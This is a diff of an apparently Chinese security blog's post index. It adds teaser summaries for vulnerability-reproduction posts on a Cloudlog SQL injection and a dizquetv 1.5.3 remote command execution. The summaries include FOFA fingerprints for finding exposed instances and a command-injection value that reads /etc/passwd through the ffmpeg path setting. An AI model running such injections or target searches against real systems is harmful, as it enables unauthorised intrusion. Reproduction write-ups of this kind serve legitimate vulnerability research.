@@ -48,6 +48,53 @@
     <div class="post-list">
   
   <section class="post-item">
+    <a class="post-item-title" href="/2024/11/21/Cloudlog-sql%E6%B3%A8%E5%85%A5/">Cloudlog_sql注入</a>
+    <div class="post-item-summary">
+      Cloudlog 是一个自托管的 PHP 应用程序，它允许你在任何地方记录你的业余无线电联络。
+fofa：icon\_hash=&quot;-460032467&quot;
+https://github.com/magicbug/Cloudlog
+POST /index.php/oqrs/delete_oqrs_line HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWeb
+      <a class="read-more" href="/2024/11/21/Cloudlog-sql%E6%B3%A8%E5%85%A5/"> ... </a>
+    </div>
+    <div class="post-item-extra">
+      <div class="date">2024.11.21</div>
+      <div class="tags">
+        
+        <div class="tag-item">漏洞复现</div>
+        
+      </div>
+    </div>
+  </section>
+  
+  <section class="post-item">
+    <a class="post-item-title" href="/2024/11/21/dizquetvRCE/">dizquetv-1.5.3 rce</a>
+    <div class="post-item-summary">
+      fofa: icon_hash&#x3D;”775930718”
+http://127.0.0.1:8000/#!&#x2F;settings
+ffmpeg 子页面将可执行路径改为
+&quot;; cat /etc/passwd &amp;&amp; echo &#39;poc&#39;&quot;
+点击update
+
+访问version
+
+跟进到代码中
+src&#x2F;ffmpeg-info.js
+exec 方法接收到的参数会被执行，因此必须谨慎处理，以避免执行不受信任的
+      <a class="read-more" href="/2024/11/21/dizquetvRCE/"> ... </a>
+    </div>
+    <div class="post-item-extra">
+      <div class="date">2024.11.21</div>
+      <div class="tags">
+        
+        <div class="tag-item">漏洞复现</div>
+        
+      </div>
+    </div>
+  </section>
+  
+  <section class="post-item">
     <a class="post-item-title" href="/2024/11/21/%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/">鉴权绕过手段</a>
     <div class="post-item-summary">
       参考链接https://blog.51cto.com/u_15076204&#x2F;3992137什么是httpservletrequest请求
